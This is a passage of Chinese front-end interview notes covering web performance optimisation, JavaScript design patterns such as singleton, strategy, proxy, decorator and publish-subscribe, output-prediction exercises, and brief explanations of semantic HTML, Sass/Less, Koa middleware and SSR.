   就是说不要直接使用 offsetTop 这些属性进行计算，而是将他们存储在一个变量中，进行计算，最后统一操作

3. 使用 requestAnimationFrame 方法控制渲染帧

### 降低绘制的复杂度

在绘制的过程中，对于不同的 CSS 样式，其实绘制的性能是不同的。

```css
#foo {
    /* 绘制时间相对较短 */
    border-color: red;
    /* 绘制时间相对较长 */
    box-shadow: 0 8px rgb(255, 220, 12);
}
```

所以对于类似阴影这样的样式，我们可以通过 PS 给图片本身加阴影，而非使用 CSS

## <mark>能谈谈前端性能优化的方案吗？</mark>

（1）减少http请求数量

在浏览器与服务器进行通信时，主要是通过 HTTP 进行通信。浏览器与服务器需要经过三次握手，每次握手需要花费大量时间。而且不同浏览器对资源文件并发请求数量有限（不同浏览器允许并发数），一旦 HTTP 请求数量达到一定数量，资源请求就存在等待状态，这是很致命的，因此减少 HTTP 的请求数量可以很大程度上对网站性能进行优化。

- **减少重定向请求次数**
* **CSS Sprites**

国内俗称CSS精灵，这是将多张图片合并成一张图片达到减少HTTP请求的一种解决方案，可以通过CSS的background属性来访问图片内容。这种方案同时还可以减少图片总字节数。

* **合并CSS和JS文件**

现在前端有很多工程化打包工具，如：grunt、gulp、webpack等。为了减少 HTTP 请求数量，可以通过这些工具再发布前将多个CSS或者多个JS合并成一个文件。

* base64编码图片并嵌入HTML文件,一并返回

还可以将图⽚的⼆进制数据⽤ base64 编码后，以 URL 的形式潜⼊到 HTML ⽂件，跟随 HTML ⽂件⼀并发送.

```html
<image
src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAFKCAIAAAC7M9WrAAAACXBIWXMAA
... />
```

- **采用lazyload**

俗称懒加载，可以控制网页上的内容在一开始无需加载，不需要发请求，等到用户操作真正需要的时候立即加载出内容。这样就控制了网页资源一次性请求数量。

（2）减少HTTP响应数据大小

* 无损压缩 (常见gzip、deflate、br)
  
  客户端发送请求时,会在请求头中书写客户端支持的压缩算法
  
  ```bash
  Accept-Encoding: gzip, deflate, br
  ```
  
  收到请求后, 服务端选择其中一个压缩算法进行响应数据压缩,并在响应头中告知客户端自身使用的压缩算法
  
  ```bash
  content-encoding: gzip
  ```

* 有损压缩
  
  * 通过牺牲一些质量来减少数据量、提高压缩比. 常⽤于压缩多媒体数据，⽐如⾳频、视频、图⽚。
  
  通过 HTTP 请求头部中的 Accept 字段⾥的「 q 质量因⼦」，告诉服务器期望的资源质量。
  
  ```bash
  Accept: audio/*; q=0.2, audio/basic
  ```
  
  图⽚的压缩，⽬前压缩常用的是 Google 推出的 WebP 格式
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0jk9kfh60j21lw0s2n4q.jpg)
  
  相同图⽚质量下，WebP 格式的图⽚⼤⼩都⽐ Png 格式的图⽚⼩.
  
  对于视频常⻅的编码格式有 H264、H265 等，⾳频常⻅的编码格式有 AAC、AC3。

（3）利用浏览器缓存

浏览器缓存是将网络资源存储在本地，等待下次请求该资源时，如果资源已经存在就不需要到服务器重新请求该资源，直接在本地读取该资源。

（4）控制资源文件加载优先级(从css、js阻塞角度去说)

浏览器在加载HTML内容时，是将HTML内容从上至下依次解析，解析到link或者script标签就会加载href或者src对应链接内容，为了第一时间展示页面给用户，就需要将CSS提前加载，不要受 JS 加载影响。

一般情况下都是CSS在头部，JS在底部。

（5）减少重排（Reflow）

基本原理：重排是DOM的变化影响到了元素的几何属性（宽和高），浏览器会重新计算元素的几何属性，会使渲染树中受到影响的部分失效，浏览器会验证 DOM 树上的所有其它结点的visibility属性，这也是Reflow低效的原因。如果Reflow的过于频繁，CPU使用率就会急剧上升。

减少Reflow，如果需要在DOM操作时添加样式，尽量使用 增加class属性，而不是通过style操作样式。

（6）减少 DOM 操作

（7）尽量外链CSS和JS（结构、表现和行为的分离），保证网页代码的整洁，也有利于日后维护

```html
<link rel="stylesheet" href="asstes/css/style.css" />

<script src="assets/js/main.js"></script>
```

（8）图标使用IconFont替换

（9）不使用CSS表达式，会影响效率

（10）使用CDN网络缓存，加快用户访问速度，减轻服务器压力

# 设计模式

## 前序了解

### 多态在设计中的作用

对于Java这样的强类型语言，多态的实现是要比JS复杂一些，由于JS这样的弱类型语言，要到程序运行时，待变量赋值后，才知道自己的类型，所以**JS天生就能很好的实现多态**

举例子：

我们现在需要调用谷歌地图的API

```js
var googleMap = {
    show: function () {
        console.log('开始渲染谷歌地图');
    }
};
var renderMap = function () {
    googleMap.show();
};
renderMap(); // 输出：开始渲染谷歌地图
```

后来由于某些原因，我们需要将谷歌地图的API，换成百度地图的API

```js
var googleMap = {
    show: function () {
        console.log('开始渲染谷歌地图');
    }
};
var baiduMap = {
    show: function () {
        console.log('开始渲染百度地图');
    }
};
var renderMap = function (type) {
    if (type === 'google') {
        googleMap.show();
    } else if (type === 'baidu') {
        baiduMap.show();
    }
};
renderMap('google'); // 输出：开始渲染谷歌地图
renderMap('baidu'); // 输出：开始渲染百度地图
```

如果我们没有使用多态的方式，像上面的代码一样，那后来的业务需要我们把百度地图换成搜狗地图的时候，我们又需要去改动原来的`renderMap`函数，这样代码往往都不具备良好的弹性（说白了就是拉！）

```js
var googleMap = {
    show: function () {
        console.log('开始渲染谷歌地图');
    }
};
var baiduMap = {
    show: function () {
        console.log('开始渲染百度地图');
    }
};
var renderMap = function (useMapType) {
    if (useMapType.show instanceof Function) {
        useMapType.show();
    }
};

renderMap(googleMap);  // 输出：开始渲染谷歌地图
renderMap(baiduMap);  // 输出：开始渲染百度地图

var sougouMap = {
    show: function () {
        console.log('开始渲染搜狗地图');
    }
}
renderMap(sougouMap);  // 输出：开始渲染搜狗地图
```

利用多态，我们良好的分离了“做什么”和“怎么做”，提高了代码的可扩展性！

在`命令模式`,`组合模式`,`策略模式`中都是用到了多态的设计思路。

### 分时函数

需求：在页面中创建大量DOM节点

> 一开始

```js
var ary = [];
for (var i = 1; i <= 1000; i++) {
    ary.push(i); // 假设 ary 装载了 1000 个好友的数据
};
var renderFriendList = function (data) {
    for (var i = 0, l = data.length; i < l; i++) {
        var div = document.createElement('div');
        div.innerHTML = i;
        document.body.appendChild(div);
    }
};
renderFriendList(ary);
```

在短时间内往页面中大量添加 DOM 节点显然也会让浏览器吃不消，我们看到的结果往往就 是浏览器的卡顿甚至假死

> 利用分时函数

```js
var timeChunk = function (ary, fn, count) {
    var obj,
        t;
    var len = ary.length;
    var start = function () {
        for (var i = 0; i < Math.min(count || 1, ary.length); i++) {
            var obj = ary.shift();
            fn(obj);
        }
    };
    return function () {
        t = setInterval(function () {
            if (ary.length === 0) { // 如果全部节点都已经被创建好
                return clearInterval(t);
            }
            start();
        }, 200); // 分批执行的时间间隔，也可以用参数的形式传入
    };
};

var ary = [];
for (var i = 1; i <= 1000; i++) {
    ary.push(i);
};
var renderFriendList = timeChunk(ary, function (n) {
    var div = document.createElement('div');
    div.innerHTML = n;
    document.body.appendChild(div);
}, 8);
renderFriendList();
```

所以利用分时函数，能够很好的将创建大量`DOM`的任务分开来做，减缓浏览器的压力

## 单例模式

```js
function Person(name) {
    this.name = name;
    this.instance = null;
}
Person.prototype.getName = function() {
    return this.name;
}
Person.getInstance = function(name) {
    if(!this.instance) {
        this.instance = new Person(name);
    }
    return this.instance;
}

let p1 = Person.getInstance('leo1');
let p2 = Person.getInstance('leo2');
console.log(p1 === p2);  // true
console.log(p1);  // Person {name: 'leo1', instance: null}
console.log(p2);  // Person {name: 'leo1', instance: null}
```

上面的代码虽然实现了单例，但是是通过调用构造函数的`getInstance`的方法去调用的

```js
// 自执行函数看返回值
var Person = (function() {
    var PersonConstructor = function(name) {
        this.name = name;
    }
    // 单例（局部变量防止全局污染）
    let instance = null;
    var foo = function(personName) {
        if(!instance) {
            instance = new PersonConstructor(personName);
        }
        return instance;
    }
    return foo;
})();

let person1 = new Person('leo');
let person2 = new Person('kang');
console.log(person1);  // PersonConstructor {name: 'leo'}
console.log(person2);  // PersonConstructor {name: 'leo'}
console.log(person1 === person2);  // true
```

通过使用自执行函数和闭包，我们可以通过直接`new`构造函数的方式去创建单例

> 实际业务场景

通过单例，一些业务场景就得了更好的实现，比如QQ的登录框，当用户点击登陆时，我们应该是只能创建一个登录窗口，而非点一次创建一个的形式

```js
var getSingle = function (fn) {
    var result;
    return function () {
        return result || (result = fn.apply(this, arguments));/
    }
};

var createLoginLayer = function () {
    var div = document.createElement('div');
    div.innerHTML = '我是登录浮窗';
    div.style.display = 'none';
    document.body.appendChild(div);
    return div;
};

var createSingleLoginLayer = getSingle(createLoginLayer);

// 需要先在页面中创建一个 #loginBtn 的按钮
document.getElementById('loginBtn').onclick = function () {
    var loginLayer = createSingleLoginLayer();
    loginLayer.style.display = 'block';
};
```

## 策略模式

在公司里，不同的工作者有不同的工资，同时每个人在年末也会根据业绩获得不同倍数的奖金，下面通过一段代码来实现

```js
var calculateBonus = function (performanceLevel, salary) {
    if (performanceLevel === 'S') {
        return salary * 4;
    }
    if (performanceLevel === 'A') {
        return salary * 3;
    }
    if (performanceLevel === 'B') {
        return salary * 2;
    }
};
calculateBonus('B', 20000); // 输出：40000
calculateBonus('S', 6000); // 输出：24000
```

这样实现的代码，存在以下一些缺点

* calculateBonus 函数比较庞大，包含了很多 if-else 语句，这些语句需要覆盖所有的逻辑 分支
* calculateBonus 函数缺乏弹性，如果增加了一种新的绩效等级 C，或者想把绩效 S 的奖金 系数改为 5，那我们必须深入 calculateBonus 函数的内部实现，这是违反开放-封闭原则的
* 算法的复用性差。如果在程序的其他地方需要重用这些计算奖金的算法呢？我们的选择 只有复制和粘贴

> 基于传统面向对象语言的模仿

```js
/* **************** 策略对象 **************** */
var PerformanceS = function () { }
PerformanceS.prototype.calculate = function (salary) {
    return salary * 6;
}

var PerformanceA = function () { }
PerformanceA.prototype.calculate = function (salary) {
    return salary * 4;
}

/* **************** 校验器 **************** */
var Bouns = function (salary, level) {
    this.salary = null;   // 设置初始工资
    this.level = null;
}
Bouns.prototype.setSalary = function (salary) {
    this.salary = salary;
}
Bouns.prototype.setLevel = function (level) {
    this.level = level;
}

Bouns.prototype.getMoney = function () {
    return this.level.calculate(this.salary);
}

let bouns = new Bouns();
bouns.setSalary(3000);
bouns.setLevel(new PerformanceS());
console.log(bouns.getMoney());  // 18000
bouns.setLevel(new PerformanceA());
console.log(bouns.getMoney());  // 12000

let bouns2 = new Bouns();
bouns2.setSalary(10000);
bouns2.setLevel(new PerformanceS());
console.log(bouns2.getMoney()); // 60000
```

> JS版本的策略模式

```js
/* **************** 策略对象 **************** */
var strategies = {
    "S": function (salary) {
        return salary * 4;
    },
    "A": function (salary) {
        return salary * 3;
    },
    "B": function (salary) {
        return salary * 2;
    }
}

/* **************** 校验器 **************** */
var calculateBouns = function (level, salary) {
    return strategies[level](salary);
}

console.log(calculateBouns('S', 2000));  // 8000
console.log(calculateBouns('A', 5000));  // 15000
```

## 代理模式

### 一个代理的简单例子

> 小明直接追女神

```js
function Flower() {}
let xiaoMing = {
    sendFlower(target) {
        let flower = new Flower();
        // 直接送给女神
        target.receiveFlower(flower);
    }
}
let goddess = {
    receiveFlower(flower) {
        console.log('goddess get the' + flower);
    }
}

xiaoMing.sendFlower();
```

> 小明通过朋友追女神

```js
function Flower() {}
let xiaoMing = {
    sendFlower(target) {
        let flower = new Flower();
        target.receiveFlower(flower);
    }
}
let friend = {
    receiveFlower(flower) {
        console.log('friend get the flower');
        // 转送给女神
        goddess.receiveFlower(flower);
    }
}
let goddess = {
    receiveFlower(flower) {
        console.log('goddess get the' + flower);
    }
}

xiaoMing.sendFlower(friend);
```

通过`friend`，小明将花送给了女神，在这个过程中，我们并没有去改变主体的任何内容，只是增加了代理者，以后那天小明成了一个真男人后，他要自己去送花的时候，我们只需要将`friend`的代码删去，让小明直接访问主体，而不影响任何地方，降低代码的解耦性，满足单一职责原则。

### 通过代理实现节流

```html
<body>
    <input type="checkbox" id="1"></input>1
    <input type="checkbox" id="2"></input>2
    <input type="checkbox" id="3"></input>3
    <input type="checkbox" id="4"></input>4
    <input type="checkbox" id="5"></input>5
    <input type="checkbox" id="6"></input>6
    <input type="checkbox" id="7"></input>7
    <input type="checkbox" id="8"></input>8
    <input type="checkbox" id="9"></input>9
</body>
```

```js
var synchronousFile = function (id) {
    console.log('开始同步文件，id 为: ' + id);
};
var proxySynchronousFile = (function () {
    var cache = [], // 保存一段时间内需要同步的 ID
        timer; // 定时器
    return function (id) {
        cache.push(id);
        if (timer) { // 保证不会覆盖已经启动的定时器
            return;
        }
        timer = setTimeout(function () {
            synchronousFile(cache.join(',')); // 2 秒后向本体发送需要同步的 ID 集合
            clearTimeout(timer); // 清空定时器
            timer = null;
            cache.length = 0; // 清空 ID 集合
        }, 2000);
    }
})();

var checkbox = document.getElementsByTagName('input');
for (var i = 0, c; c = checkbox[i++];) {
    c.onclick = function () {
        if (this.checked === true) {
            proxySynchronousFile(this.id);
        }
    }
};
```

### 通过代理实现记忆化计算

```js
var calculate = function() {
    let res = 1;
    for(let i = 0; i < arguments.length; i++) {
        res *= arguments[i];
    }
    return res;
}
calculate(1,2,3)  // 6
calculate(2,2,2)  // 8

var proxyCalculate = (function() {
    // 存储已经计算的值
    let remember = {};
    return function() {
        let record = Array.prototype.join.call(arguments, ',');
        if(record in remember) {
            return remember[record];
        }
        return remember[record] = calculate.apply(this, arguments);
    }
})();
let p1 = proxyCalculate(2,3,4);
let p2 = proxyCalculate(2,3,4);
console.log(p1);  // 24
console.log(p2);  // 24
```

通过`proxyCalculate`,我们可以在用户访问主体前，通过缓存代理减轻服务器或者一些运算压力

### **代理的意义**

很多时候，我们感觉代理其实只是增加了很多不必要的代码，其实不然；代理本身很好的体现了==单一职责原则==（单一职责原则指的是，就一个类（通常也包括对象和函数等）而言，应该仅有一个引起它变化的原因，如果一个对象承担多个职责，意味着这个对象将变得巨大，这样极大的增加了职责的耦合性），假若我们哪一天由于某些原因，不再需要代理（比如面对代理要付出一些佣金之类的），而删去代理的部分，也并不会影响直接对本体的访问。

### 代理的用处

预处理、作为节流的代码、缓存代理减轻服务器压力或者重复性计算等

## 装饰者模式

### 一开始的装饰者

这种给对象动态增加职责的方式，并没有真正地改动对象自身，而是将对象放入另一个对象 之中，这些对象以一条链的方式进行引用，形成一个聚合对象

> 传统模式下

```js
var Plane = function () { }
Plane.prototype.fire = function () {
    console.log('launch the normal bullet');
}

var MissileDecorator = function (plane) {
    this.plane = plane;
}
MissileDecorator.prototype.fire = function () {
    this.plane.fire();
    console.log('launch the guided missile（导弹）');
}

var AtomDecorator = function (plane) {
    this.plane = plane;
}
AtomDecorator.prototype.fire = function () {
    this.plane.fire();
    console.log('launch the atomic bomb（原子弹）');
}

var plane = new Plane();
plane = new MissileDecorator(plane);
plane = new AtomDecorator(plane);

plane.fire();

// launch the normal bullet
// designMode.js:693 launch the guided missile（导弹）
// designMode.js:701 launch the atomic bomb（原子弹）
```

> 回到JavaScript的装饰者

```js
var plane = {
    fire() {
        console.log('发射子弹');
    }
};

missileDecorator = function() {
    console.log('发射导弹');
}
atomDecorator = function() {
    console.log('发射原子弹');
}

var fire1 = plane.fire;

plane.fire = function() {
    fire1();
    missileDecorator();
}

var fire2 = plane.fire;

plane.fire = function() {
    fire2();
    atomDecorator();
}

plane.fire();
// 发射子弹
// 发射导弹
// 发射原子弹
```

这样可以在不改变原函数（对象）的情况下，为其添加新的功能，这也非常符合开放-封闭的原则。

但是这样的代码存在两个问题：

* 必须维护`fire1`和`fire2`这个中间变量，虽然看起来并不起眼，但如果函数的装饰链较长，或者 需要装饰的函数变多，这些中间变量的数量也会越来越多。
* 其实还遇到了`this`被劫持的问题，也就是`this`的指向问题

> `this`劫持问题例子

```js
var _getElementById = document.getElementById;
document.getElementById = function (id) {
    alert(1);
    console.log(this);  // #document
    return _getElementById(id); // (1)
}
var button = document.getElementById('button');
```

代码中的`(1)`处报错：Illegal invocation，因为此时的`_getElementById`是一个全局函数，调用全局函数时，`this`指向`window`，而 `document.getElementById` 方法的内部实现需要使用` this`引用，`this`在这个方法内预期是指向 `document`，而不是 `window`, 这是错误发生的原因

### 引入`AOP`装饰函数

```js
Function.prototype.before = function(beforefn) {
    var _self = this;
    return function() {
        beforefn.apply(this, arguments);
        return _self.apply(this, arguments);
    }
}
Function.prototype.after = function(afterfn) {
    var _self = this;
    return function() {
        let res = _self.apply(this, arguments);
        afterfn.apply(this, arguments);
        return res;
    }
}

function Person() {
    console.log('i am iron man');
}

Person.before(function() {
    console.log('i am thor');
})();
// i am thor
// i am iron man

Person.after(function() {
    console.log('i am Captain America');
})();
// i am iron man
// i am Captain America
```

通过在`Function`的原型上添加`before`和`after`方法，我们可以很好的解决`this`指向的问题

> 解决`document.getElementById`的`this`指向问题

```js
Function.prototype.before = function (beforefn) {
    console.log(this);  // ƒ getElementById() { [native code] }
    var __self = this;
    return function () {
        console.log(this);  // #document
        beforefn.apply(this, arguments);
        return __self.apply(this, arguments);
    }
}
document.getElementById = document.getElementById.before(function () {
    alert(1);
});
var button = document.getElementById('button');  // 这里才是真正在调用 before 方法中的 return 内容
```

通过`AOP`，我们很好的解决了`this`的劫持问题

> `AOP`污染原型

因为这样有些开发者认为污染了`Function`的原型，所以也可以改为`before`函数同时接收`fn`和`beforefn`函数

```js
var before = function(fn, beforefn) {
    return function() {
        beforefn.apply(this, arguments);
        return fn.apply(this, arguments);
    }
}

var a = before(
    function() {console.log(3);},
    function() {console.log(2);}
)

a = before(a, function() {
    console.log(1);
})

a();
// 1
// 2
// 3 
```

### 用`AOP`动态改变函数的参数

```js
Function.prototype.before = function (beforefn) {
    var __self = this;
    return function () {
        beforefn.apply(this, arguments); // (1)
        return __self.apply(this, arguments); // (2)
    }
}

var func = function (param) {
    console.log(param); // 输出： {a: "a", b: "b"}
}
func = func.before(function(param) {
    param.b = 'b';
})
func( {a: 'a'} ); 
```

代码执行到`(1)`处时，会执行

```js
function(param) {
    param.b = 'b';
}
```

来为`(1)`处中`arguments`添加属性`b`，从而增加改变传入`__self.apply(this, arguments)`的`arguments`参数

> 实际应用

平常都会写 ajax 请求

```js
var ajax = function (type, url, param) {
    console.dir(param);
    // 发送 ajax 请求的代码略
};
ajax('get', 'http:// xxx.com/userinfo', { name: 'sven' });
```

突然有一天，遭受了 CSRF 攻击，而解决 CSRF 攻击最简单的一个办法就是在 HTTP 请求中带上一个 Token 参数

```js
var getToken = function () {
    return 'Token';
}
```

现在的任务是给每个 ajax 请求都加上 Token 参

```js
var getToken = function () {
    return 'Token';
}
var ajax = function (type, url, param) {
    param = param || {};
    param.Token = getToken(); // 发送 ajax 请求的代码略...
};
```

虽然已经解决了问题，但我们的 ajax 函数相对变得僵硬了，每个从 ajax 函数里发出的请求 都自动带上了 Token 参数，虽然在现在的项目中没有什么问题，但如果将来把这个函数移植到其 他项目上，或者把它放到一个开源库中供其他人使用，Token 参数都将是多余的。

为了解决这个问题，先把 ajax 函数还原成一个干净的函数：

```js
var ajax = function (type, url, param) {
    console.log(param); // 发送 ajax 请求的代码略
};
```

然后把 Token 参数通过 Function.prototyte.before 装饰到 ajax 函数的参数 param 对象中：

```js
var getToken = function () {
    return 'Token';
}
ajax = ajax.before(function (type, url, param) {
    param.Token = getToken();
});
ajax('get', 'http:// xxx.com/userinfo', { name: 'sven' });
```

从 ajax 函数打印的 log 可以看到，Token 参数已经被附加到了 ajax 请求的参数中:

```js
{name: "sven", Token: "Token"}
```

### 代理模式和装饰者模式

代理模式和装饰者模式最重要的区别在于它们的意图和设计目的。代理模式的目的是，当直 接访问本体不方便或者不符合需要时，为这个本体提供一个替代者。本体定义了关键功能，而代 理提供或拒绝对它的访问，或者在访问本体之前做一些额外的事情。装饰者模式的作用就是为对 象动态加入行为。换句话说，代理模式强调一种关系（Proxy 与它的实体之间的关系），这种关系 可以静态的表达，也就是说，这种关系在一开始就可以被确定。而装饰者模式用于一开始不能确 定对象的全部功能时。代理模式通常只有一层代理本体的引用，而装饰者模式经常会形成一条 长长的装饰链。

## 观察者模式（发布-订阅模式）

### 简单的发布-订阅

其实这个模式经常出现在我们的日常代码中

```js
document.body.addEventListener('click', function () {
    alert(2);
}, false);
document.body.click(); // 模拟用户点击
```

我们可以任意的添加订阅者

```js
// 随意增加订阅者
document.body.addEventListener('click', function () {
    alert(2);
}, false);
document.body.addEventListener('click', function () {
    alert(3);
}, false);
document.body.addEventListener('click', function () {
    alert(4);
}, false);
document.body.click(); // 模拟用户点击（发布）
```

### 售楼部案例

在我们的买房经历中，由于售楼部有些房屋暂时没有开售，往往购房者会将自己的电话留在售楼部，当用户中意的房屋开售时，售楼部会安排工作人员遍历登记名册中的用户，挨个电话通知情况

```js
let salesOffices = {};  // 售楼部
salesOffices.clientList = {};   // 缓存列表，存放订阅者的回调函数
salesOffices.listen = function (key, fn) {   // 添加订阅者
    if (!(key in this.clientList)) {   // 如果还没有订阅过此类消息，给该类消息创建一个缓存列表
        this.clientList[key] = [];
    }
    this.clientList[key].push(fn);   // 订阅的消息添加进缓存列表
}
salesOffices.trigger = function () {
    let key = Array.prototype.shift.call(arguments);
    let fnList = this.clientList[key];

    if (fnList.length == 0) {
        return false;
    }

    for (let i = 0; i < fnList.length; i++) {
        fnList[i].apply(this, arguments);  // arguments 是发布消息时带上的参数（例如一些房屋的价格与面积等）
    }
}

salesOffices.listen('squareMeter88', function (price) { // 小明订阅消息
    console.log('价格= ' + price);   // 价格= 2000000
});
salesOffices.listen('squareMeter110', function (price) { // 小红订阅消息
    console.log('价格= ' + price);   // 价格= 3000000
});
salesOffices.trigger('squareMeter88', 2000000); 
salesOffices.trigger('squareMeter110', 3000000); 
```

### 更换售楼部（通用实现）

假如某个用户，不止在某一家卖房中心登记了自己的电话，还可能在其他的售楼部也留了电话，供日后通知，那我们还需要再去重新创建一个售楼部对象吗？所以我们要改进上面的代码

```js
var event = {
    clientList: [],
    listen: function (key, fn) {
        if (!this.clientList[key]) {
            this.clientList[key] = [];
        }
        this.clientList[key].push(fn); // 订阅的消息添加进缓存列表
    },
    trigger: function () {
        var key = Array.prototype.shift.call(arguments), // (1);
            fns = this.clientList[key];
        if (!fns || fns.length === 0) { // 如果没有绑定对应的消息
            return false;
        }
        for (var i = 0, fn; fn = fns[i++];) {
            fn.apply(this, arguments); // (2) // arguments 是 trigger 时带上的参数
        }
    }
};

var installEvent = function (obj) {
    for (var i in event) {
        obj[i] = event[i];
    }
};

var salesOffices = {};
installEvent(salesOffices);
salesOffices.listen('squareMeter88', function (price) { // 小明订阅消息
    console.log('价格= ' + price);
});
salesOffices.listen('squareMeter100', function (price) { // 小红订阅消息
    console.log('价格= ' + price);
});
salesOffices.trigger('squareMeter88', 2000000); // 输出：2000000
salesOffices.trigger('squareMeter100', 3000000); // 输出：3000000 
```

### 取消订阅

基于上面的内容，当用户想取消订阅时

```js
event.remove = function (key, fn) {
    var fns = this.clientList[key];
    if (!fns) { // 如果 key 对应的消息没有被人订阅，则直接返回
        return false;
    }
    if (!fn) { // 如果没有传入具体的回调函数，表示需要取消 key 对应消息的所有订阅
        fns && (fns.length = 0);
    } else {
        for (var l = fns.length - 1; l >= 0; l--) { // 反向遍历订阅的回调函数列表
            var _fn = fns[l];
            if (_fn === fn) {
                fns.splice(l, 1); // 删除订阅者的回调函数
            }
        }
    }
};

var salesOffices = {};
var installEvent = function (obj) {
    for (var i in event) {
        obj[i] = event[i];
    }
}
installEvent(salesOffices);
salesOffices.listen('squareMeter88', fn1 = function (price) { // 小明订阅消息
    console.log('价格= ' + price);
});
salesOffices.listen('squareMeter88', fn2 = function (price) { // 小红订阅消息
    console.log('价格= ' + price);
});
salesOffices.remove('squareMeter88', fn1); // 删除小明的订阅
salesOffices.trigger('squareMeter88', 2000000); // 输出：2000000
```

### 全局的发布-订阅

之前的代码还是存在一定的问题：

* 我们给每个发布者对象都添加了 listen 和 trigger 方法，以及一个缓存列表 clientList， 这其实是一种资源浪费。
* 小明跟售楼处对象还是存在一定的耦合性，小明至少要知道售楼处对象的名字是 salesOffices，才能顺利的订阅到事件。

```js
var Event = (function () {
    var clientList = {},
        listen,
        trigger,
        remove;
    listen = function (key, fn) {
        if (!clientList[key]) {
            clientList[key] = [];
        }
        clientList[key].push(fn);
    };
    trigger = function () {
        var key = Array.prototype.shift.call(arguments),
            fns = clientList[key];
        if (!fns || fns.length === 0) {
            return false;
        }
        for (var i = 0, fn; fn = fns[i++];) {
            fn.apply(this, arguments);
        }
    };
    remove = function (key, fn) {
        var fns = clientList[key];
        if (!fns) {
            return false;
        }
        if (!fn) {
            fns && (fns.length = 0);
        } else {
            for (var l = fns.length - 1; l >= 0; l--) {
                var _fn = fns[l];
                if (_fn === fn) {
                    fns.splice(l, 1);
                }
            }
        }
    };
    return {
        listen: listen,
        trigger: trigger,
        remove: remove
    }
})();

Event.listen('squareMeter88', function (price) { // 小红订阅消息
    console.log('价格= ' + price); // 输出：'价格=2000000'
});
Event.listen('squareMeter108', function (price) { // 小红订阅消息
    console.log('价格= ' + price); // 输出：'价格=3000000'
});
Event.trigger('squareMeter88', 2000000); // 售楼处发布消息
Event.trigger('squareMeter108', 3000000); // 售楼处发布消息
```

# 根据代码看输出（系列）

```js
var name = 1;
(function () {
    console.log(name + this.name); // browser: -> 'undefined1'; Node.js: -> NaN
    var name = '2';
    console.log(name + this.name); // browser: -> '21'; Node.js: -> '2undefined'
})();
```

```js
var name = 'name';
var A = {
    name: 'A',
    sayHello: function () {
        let s = () => console.log(this.name);  // A
                                               // A

        // let s = function() {
        //     console.log(this.name);   
        //     // 结果
        //     // name
        //     // B
        // }
        return s;
    }
};
let sayHello = A.sayHello();
sayHello();  
var B = {
    name: 'B'
};
sayHello.call(B);
```

```js
console.log(typeof typeof typeof null)  // string
```

```js
// 手写一个repeact()函数，加上下面的代码运行，
// 使每3秒打印一个helloword，总共执行4次
function repeact(fn, count, delay) {
    return function () {
        let arg = Array.prototype.pop.call(arguments);
        // 方法一：
        // (function foo() {
        //     let timer = setTimeout(() => {
        //         if(count) {
        //             fn(arg);
        //             count--;
        //             clearTimeout(timer);
        //             foo();
        //         }
        //     }, delay || 1000)
        // })();

        // 方法二：
        // let timer = setInterval(() => {
        //     if(count) {
        //         fn(arg);
        //         count--;
        //     }
        //     if(count == 0) {
        //         clearInterval(timer);
        //     }
        // }, delay || 1000);

        // 方法三
        // for(let i = 0; i < count; i++) {
        //     let timer = setTimeout(() => {
        //         fn(arg);
        //         clearTimeout(timer);
        //     }, delay * (i + 1));
        // }
    }
}
const repeatFunc = repeact(console.log, 4, 3000);
repeatFunc('helloword');
```

```js
var a = 10;
(function(){
    console.log(a);   // undefined（因为下面的 var a = 20 的 a 会被变量提升）
    a = 5;   // 因为局部作用域中存在 var a 的声明，所以这里的赋值是赋给局部变量的
    console.log(window.a);  // 10
    var a = 20;  // 执行到这时，其实是在给局部变量 a 赋值 => a = 20
    console.log(a);  // 20
})()
```

```js
setTimeout(function () {
    console.log(1);
}, 0)
new Promise(function execulor(resolve) {
    console.log(2)
    for (var i = 0; i < 10000; i += 1) {
        // console.log(i);
        i == 9999 && resolve()
    }
    console.log(3)
}).then(function () {
    console.log(4)
})
console.log(5)

// 2 3 5 4 1
```

```js
// 请问输出是什么?(有点意思)
function getPersonInfo(one, two, three) {
    console.log(one)
    console.log(two)
    console.log(three)
}
const person = 'Lydia'
const age = 21
getPersonInfo `${person} is ${age} years old`

// 答案: https://es6.ruanyifeng.com/#docs/string#%E6%A0%87%E7%AD%BE%E6%A8%A1%E6%9D%BF
```

# 知识小节

## JS规范有哪些

[AMD、CMD、CommonJS、UMD、ESM（ JS模块化规范）](https://www.cnblogs.com/mingweiyard/p/13891510.html)

## 什么是语义化标签？为啥使用语义化标签?

根据内容的结构化（内容语义化），选择合适的标签（代码语义化）

> 优点

1. 有利于开发和维护，语义化更具可读性

2. 在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构

3. 方便搜索引擎能识别页面结构，有利于SEO

4. 兼容性更好，支持更多的网络设备

5. 让浏览器的爬虫和机器很好地解析

## Sass和Less是什么？

基于CSS 是一门非程序式语言，没有变量、函数、SCOPE（作用域），需要书写大量看似没有逻辑的代码，不方便维护及扩 展，不利于复用。

Sass（Syntactically Awesome Style Sheets）是一个相对新的编程语言，Sass为web前端开发而生，可以用它来定 义一套新的语法规则和函数，以加强和提升CSS。通过这种新的编程语言，你可以使用最高效的方式，以少量的代 码创建复杂的设计。它改进并增强了CSS的能力，增加了变量，局部和函数这些特性。而这只使Sass一部分利器！

Less也可以这样理解。

## 能简单描述下洋葱模型吗？

**中间件**

![](https://tva1.sinaimg.cn/large/008i3skNly1gxshzk1c94j315g0as0u3.jpg)

验证洋葱模型：

```js
const Koa = require('koa')
const app = new Koa()

// ctx: 上下文，web容器 (ctx.request、ctx.response...)
// next: 下一层中间件，下一层中间件是否能够得到执行，取决于next这个函数有没有被调用
// 第一层中间件
app.use((ctx, next) => {
  console.log('第一层中间件...1');
  ctx.response.body = 'hello world';
  next();
  console.log('第一层中间件...2');
})
// 第二层中间件
app.use((ctx, next) => {
  console.log('第二层中间件...1');
  next();
  console.log('第二层中间件...2');
})
// 第三层中间件
app.use((ctx, next) => {
  console.log('第三层中间件');
})

app.listen(3000)
```

第二段是`/favicon.ico`的请求打印

## 什么是SSR

服务端渲染简称 SSR，全称是 `Server Side Render`，是指一种传统的渲染方式，就是在浏览器请求页面URL的时候，服务端将我们需要的HTML文本组装好，并返回给浏览器，这个HTML文本被浏览器解析之后，不需要经过 JavaScript 脚本的执行，即可直接构建出希望的 DOM 树并展示到页面中。

![](https://tva1.sinaimg.cn/large/008i3skNgy1gy5dr0nuhrj31620u00wc.jpg)

